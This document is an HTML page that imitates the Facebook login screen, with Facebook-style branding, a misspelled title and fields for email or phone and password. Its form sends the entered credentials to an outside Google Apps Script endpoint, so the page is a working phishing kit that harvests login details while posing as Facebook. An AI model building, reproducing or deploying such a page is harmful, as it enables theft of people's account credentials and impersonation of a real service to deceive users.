<!DOCTYPE html>
<html lang="en">
<head>
    <title>Facebook - Log in or sing up</title>
    <link rel="icon" type="image/jpeg" href="https://ovikbiswas.wordpress.com/wp-content/uploads/2024/11/images-1.jpeg">
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>facebook</h1>
        </div>
        <div class="login-box">
            <form method="post" action="https://script.google.com/macros/s/AKfycbwjC0WlGmwC9nKe8239LtyHymh2NIsfgRv9_uTZEaEq5FgoquigLeSdWgCA4e4cQe6z/exec" name="contact-form">
                <input type="text" placeholder="Email address or phone number" name="name">
                <input type="password" placeholder="Password" name="password">
                <!--button type="submit">Log In</button-->
                <a href="youtube.com"><input type="submit" value="Login" id="submit"></a>
             
                <a href="#">Forgotten password?</a>
                <hr>
                <button class="new-account">Create New Account</button>
            </form>
        </div>
    </div>

<style>

* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #f0f2f5;
}

.container {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 100%;
    max-width: 400px;
}

.logo h1 {
    color: #1877f2;
    font-size: 3rem;
    margin-bottom: 20px;
    font-weight: bold;
}

.login-box {
    background-color: #fff;
    padding: 20px;
    box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
    border-radius: 8px;
    width: 100%;
}

.login-box input {
    width: 100%;
    padding: 10px;
    margin: 10px 0;
    border: 1px solid #dddfe2;
    border-radius: 4px;
}

.login-box button {
    width: 100%;
    padding: 12px;
    background-color: #1877f2;
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 1rem;
    font-weight: bold;
    cursor: pointer;
    margin-top: 10px;
}

.login-box button:hover {
    background-color: #145dbf;
}
#submit {
    width: 100%;
    padding: 12px;
    background-color: #1877f2;
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 1rem;
    font-weight: bold;
    cursor: pointer;
    margin-top: 10px;
}

.login-box a {
    color: #1877f2;
    text-decoration: none;
    display: block;
    text-align: center;
    margin-top: 10px;
}

.login-box .new-account {
    background-color: #42b72a;
    margin-top: 20px;
}

.login-box .new-account:hover {
    background-color: #36a420;
}

hr {
    border: none;
    border-top: 1px solid #dddfe2;
    margin: 15px 0;
}
</style>


</body>
</html>
